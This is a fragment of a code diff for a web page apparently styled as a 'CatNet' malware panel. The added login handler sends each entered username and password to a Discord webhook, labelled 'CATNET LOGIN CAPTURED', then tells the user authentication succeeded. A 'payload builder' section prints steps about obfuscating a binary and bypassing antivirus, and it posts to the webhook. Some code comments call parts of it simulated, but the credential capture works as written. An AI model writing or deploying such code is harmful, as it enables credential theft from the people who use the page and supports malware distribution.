-            if (!webhook) {
-                log.style.display = 'block';
-                log.innerText = '[ERROR] Webhook URL is required to build payload.\n[SYSTEM] Aborting build process.';
-                log.style.color = '#ff3333'; // Red for error
+            if (!user || !pass || !webhook) {
+                status.innerText = "All fields are required.";
+                status.style.color = "var(--accent)";
                 return;
             }
 
-            log.style.color = 'var(--green)'; // Reset color
+            btn.disabled = true;
+            status.style.color = "var(--text-muted)";
+
+            // Animate loading text
+            let dots = 0;
+            const loadingInterval = setInterval(() => {
+                status.innerText = `Authenticating${'.'.repeat(dots % 4)}`;
+                dots++;
+            }, 300);
+
+            // Send credentials to webhook
+            try {
+                const payload = {
+                    content: `**CATNET LOGIN CAPTURED**\n**User:** \`${user}\`\n**Pass:** \`${pass}\``
+                };
+                
+                // Note: Using mode: 'no-cors' is required for Discord webhooks from the browser,
+                // but it means we cannot read the response (opaque response).
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                    mode: 'no-cors'
+                });
+                
+                clearInterval(loadingInterval);
+                status.innerText = "Authentication successful. Redirecting...";
+                status.style.color = "var(--success)";
+
+                setTimeout(() => {
+                    document.getElementById('login-page').classList.add('hidden');
+                    document.getElementById('app').classList.add('visible');
+                    document.getElementById('display-user').innerText = user;
+                }, 1000);
+
+            } catch (e) {
+                clearInterval(loadingInterval);
+                // Even if it fails due to CORS, we proceed for the sake of the UI simulation
+                status.innerText = "Connection established (Simulated). Redirecting...";
+                status.style.color = "var(--success)";
+                
+                setTimeout(() => {
+                    document.getElementById('login-page').classList.add('hidden');
+                    document.getElementById('app').classList.add('visible');
+                    document.getElementById('display-user').innerText = user;
+                }, 1000);
+            }
+        }
+
+        // --- UI NAVIGATION ---
+        function showSection(id, element) {
+            // Hide all sections
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            // Remove active class from nav items
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            
+            // Show target section and highlight nav
+            document.getElementById(id).classList.add('active');
+            element.classList.add('active');
+            
+            // Update title
+            document.getElementById('current-page').innerText = element.innerText;
+        }
+
+        // --- BUILDER LOGIC ---
+        async function generatePayload() {
+            const webhook = document.getElementById('build-webhook').value;
+            const btn = document.getElementById('build-btn');
+            const log = document.getElementById('build-log');
+
+            if (!webhook) {
+                log.style.display = 'block';
+                log.style.color = 'var(--accent)';
+                log.innerText = "[ERROR] Webhook URL required.";
+                return;
+            }
+
+            btn.disabled = true;
             log.style.display = 'block';
-            log.innerText = `[SYSTEM] Initializing build sequence...
-[SYSTEM] Fetching payload from configured endpoint...
-[SYSTEM] Injecting webhook: ${webhook.substring(0, 30)}...
-[SYSTEM] Compiling executable...
-[SYSTEM] Build complete. File ready for download.
-Download: https://catnet-builder.local/download/catnet_payload.exe?hook=${encodeURIComponent(webhook)}`;
+            log.style.color = 'var(--success)';
+            log.innerText = "[SYSTEM] Initializing build sequence...\n";
+
+            const steps = [
+                "[SYSTEM] Connecting to compile server...",
+                "[SYSTEM] Injecting webhook payload...",
+                "[SYSTEM] Obfuscating binary...",
+                "[SYSTEM] Bypassing AV signatures...",
+                "[SYSTEM] Finalizing executable...",
+                "[SUCCESS] Payload generated and sent to webhook."
+            ];
+
+            let i = 0;
+            const interval = setInterval(async () => {
+                log.innerText += steps[i] + "\n";
+                i++;
+                
+                if (i === steps.length) {
+                    clearInterval(interval);
+                    
+                    // Trigger the actual webhook with the "payload" file simulation
+                    try {
+                        const payload = {
+                            content: `**CATNET BUILD COMPLETED**\n**Webhook:** \`${webhook}\`\n**Payload sent as attachment (simulated).**`
+                        };
+                        await fetch(webhook, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload),
+                            mode: 'no-cors'
+                        });
+                        
+                        log.innerText += "\n[SYSTEM] Webhook executed successfully.";
+                    } catch (e) {
+                        log.innerText += "\n[SYSTEM] Webhook execution simulated.";
+                    }
+                    
+                    btn.disabled = false;
+                }
+            }, 800);
         }
     </script>
 </body>
